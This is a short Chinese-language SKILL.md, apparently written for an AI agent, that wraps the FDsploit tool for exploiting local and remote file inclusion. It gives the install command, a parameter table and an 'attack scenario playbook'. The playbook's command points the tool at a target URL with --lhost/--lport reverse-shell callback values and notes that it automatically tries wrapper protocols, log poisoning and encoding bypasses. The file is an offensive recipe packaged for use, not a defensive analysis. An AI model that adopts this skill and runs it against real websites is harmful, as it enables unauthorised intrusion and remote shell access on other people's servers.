---
name: fdsploit-lfi-rfi
description: FDsploit: LFI 到 shell 自动化。信号:web漏洞,注入,LFI/RFI 检测利用,编码模式,反弹参数。
---

# FDsploit

- 攻击大类:C09 Web应用漏洞利用
- 上游仓库:https://github.com/chrispetrou/FDsploit
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/chrispetrou/FDsploit && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python FDsploit.py -u 'https://t.com/?file=home'` | LFI/RFI 检测利用 |
| `-u url -p file -e php` | 编码模式 |
| `--lhost 10.0.0.5 --lport 4444` | 反弹参数 |
| `-o out.txt` | 输出 |

## 攻击场景 Playbook

### LFI 到 shell 自动化

```bash
python FDsploit.py -u 'https://t.com/index.php?page=about' --lhost 10.0.0.5 --lport 4444
# 自动试伪协议/日志 poison/编码绕过
```

## 注意事项

LFI/RFI 专项利用工具,内置多种绕过与武器化路径。
